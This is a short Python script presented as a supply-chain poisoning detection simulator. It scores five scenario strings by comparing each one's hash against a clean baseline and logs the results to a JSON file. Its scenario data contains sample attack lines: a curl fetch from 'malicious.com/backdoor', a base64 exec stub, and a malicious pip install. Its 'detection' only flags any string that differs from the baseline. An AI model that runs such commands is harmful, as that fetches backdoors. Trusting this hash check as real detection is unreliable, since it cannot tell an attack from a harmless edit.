import sys
import os
import json
import random
import time
import hashlib
from pathlib import Path
from datetime import datetime

print("STRICT HEADLESS: Advanced Supply Chain Poisoning Simulator v2")

if "--auto" not in sys.argv and os.environ.get("HEADLESS") != "1":
    print("ERROR: Headless only.")
    sys.exit(1)

VAULT_DIR = Path.home() / "ForestVault"
VAULT_DIR.mkdir(parents=True, exist_ok=True)

def calculate_hash(data):
    return hashlib.sha256(data.encode()).hexdigest()[:16]

def simulate_attack():
    print("Simulating live supply-chain poisoning attack (Axios/Lazarus style)...")
    
    scenarios = [
        ("Clean package", "def safe(): return 'clean'", True),
        ("Maintainer hijack", "def safe(): import os; os.system('curl -s malicious.com/backdoor'); return 'backdoor'", False),
        ("Obfuscated payload", "def safe(): exec(__import__('base64').b64decode('...malicious...'))", False),
        ("Dependency confusion", "import malicious_lib; malicious_lib.run_payload()", False),
        ("Compromised wheel file", "pip install malicious-wheel", False)
    ]
    
    score = 0
    total = len(scenarios)
    
    for name, code, is_safe in scenarios:
        computed = calculate_hash(code)
        baseline = calculate_hash("def safe(): return 'clean'")
        detected = computed != baseline
        
        if (is_safe and detected is False) or (not is_safe and detected is True):
            print(f"✅ Correctly handled: {name}")
            score += 1
        else:
            print(f"❌ Failed to detect: {name}")
        
        time.sleep(2.5)
    
    perc = round((score / total) * 100, 1)
    log_file = VAULT_DIR / "supply_chain_sessions.json"
    session = {
        "timestamp": datetime.now().isoformat(),
        "score": score,
        "total": total,
        "percentage": perc,
        "trainer": "supply_chain_simulator.py"
    }
    data = json.load(open(log_file)) if log_file.exists() else []
    data.append(session)
    with open(log_file, "w") as f:
        json.dump(data, f, indent=2)
    
    print(f"Supply chain simulation complete: {score}/{total} ({perc}%) - {'Strong detection' if perc >= 80 else 'Needs improvement'}")
    return score, total

if __name__ == "__main__":
    for i in range(5):
        print(f"\n=== Advanced Poisoning Simulation Cycle {i+1} ===")
        simulate_attack()
        time.sleep(6)
    print("Advanced supply chain simulation completed - no GUI launched.")
